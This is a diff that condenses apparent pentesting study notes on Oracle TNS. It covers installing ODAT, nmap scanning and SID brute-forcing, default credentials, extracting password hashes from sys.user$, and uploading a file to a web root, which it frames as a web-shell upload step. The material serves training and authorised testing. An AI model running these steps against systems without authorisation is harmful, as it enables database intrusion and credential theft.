@@ -1,68 +1,96 @@
 **Overview:**
-The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.
-it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.
+- Oracle TNS is a communication protocol for Oracle databases, operating on TCP port 1521. Supports TCP/IP and IPX/SPX, and includes a built-in encryption layer over TCP/IP for client-server communication.
+- Configuration is split between two files in `$ORACLE_HOME/network/admin`: `tnsnames.ora` (client-side, resolves service names to network addresses) and `listener.ora` (server-side, defines listener behavior and which services to accept).
+- ODAT (Oracle Database Attacking Tool) is the primary pentesting tool for Oracle. It enumerates database names, versions, running processes, user accounts, and vulnerabilities, and supports exploitation including file upload and RCE.
+- Known default credentials to test: Oracle 9 uses `CHANGE_ON_INSTALL`, Oracle DBSNMP uses `dbsnmp`. Oracle 10+ has no default password but the `sa`-equivalent `scott/tiger` pair is commonly found in test environments.
+- SIDs (System Identifiers) uniquely identify database instances on a server. Brute-forcing SIDs is often a required first step before authentication attempts.
+---
+## Setup
 
-The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the `TCP/1521` port. 
-The default configuration of the TNS listener includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.
-
-Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one. Another example would be that many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.
-
-Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of
-the service, and the database or service name that clients should use when connecting to the service.
-
-On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.
-
-In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.
-
-##  setting up
 ```
-sudo apt-get update
 sudo apt-get install -y build-essential python3-dev libaio1
-cd ~
 wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
-tar xzf cx_Oracle-8.3.0.tar.gz
-cd cx_Oracle-8.3.0
-python3 setup.py build
-sudo python3 setup.py install
-cd ~
-git clone https://github.com/quentinhardy/odat.git
-cd odat/
+tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
+python3 setup.py build && sudo python3 setup.py install
+cd ~ && git clone https://github.com/quentinhardy/odat.git && cd odat/
 pip install python-libnmap
-git submodule init
-git submodule update
-sudo apt-get install python3-scapy -y
-sudo pip3 install colorlog termcolor passlib python-libnmap
-sudo apt-get install build-essential libgmp-dev -y
-pip3 install pycryptodome
+git submodule init && git submodule update
+sudo apt-get install python3-scapy build-essential libgmp-dev -y
+sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome
 ```
-Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance
+
+Install cx_Oracle and ODAT with all required dependencies.
 
 ```
 ./odat.py -h
 ```
-determine if the installation was succesful
-Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.
 
-## enumeration
-```
-sudo nmap -p1521 -sV 10.129.204.235 --open
-```
-We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID
+Verify ODAT installed correctly.
+
+---
+## Enumeration
 
 ```
-sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+sudo nmap -p1521 -sV --open <target>
 ```
-bruteforce sids
+
+Scan for Oracle TNS listener and retrieve version info.
 
 ```
-./odat.py all -s 10.129.204.235
+sudo nmap -p1521 -sV --open --script oracle-sid-brute <target>
 ```
-`odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc.
 
-## Database enumeration
+Brute-force valid SIDs on the target. SIDs are required before authentication.
 
 ```
-sqlplus scott/tiger@10.129.204.235/XE
+./odat.py all -s <target>
 ```
-we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.
 
+Run all ODAT modules against the target. Returns database names, versions, running processes, user accounts, and misconfigurations.
+
+---
+## Connection
+
+```
+sqlplus <user>/<password>@<target>/<SID>
+```
+
+Connect to the Oracle database using SQLPlus.
+
+```
+sqlplus <user>/<password>@<target>/<SID> as sysdba
+```
+
+Connect as SYSDBA for elevated privileges. Possible if the user has been granted the appropriate role.
+
+---
+## Database Enumeration
+
+|Command|Description|
+|---|---|
+|`select table_name from all_tables;`|List all accessible tables|
+|`select * from user_role_privs;`|Show roles granted to the current user|
+|`select name, password from sys.user$;`|Extract password hashes (requires SYSDBA)|
+
+---
+## Web Shell Upload
+
+Default web root paths by OS:
+
+|OS|Path|
+|---|---|
+|Linux|`/var/www/html`|
+|Windows|`C:\inetpub\wwwroot`|
+
+```
+echo "Oracle File Upload Test" > testing.txt
+./odat.py utlfile -s <target> -d <SID> -U <user> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+
+Upload a file to the web root using ODAT's `utlfile` module. Requires SYSDBA and a running web server.
+
+```
+curl -X GET http://<target>/testing.txt
+```
+
+Verify the file was uploaded successfully.
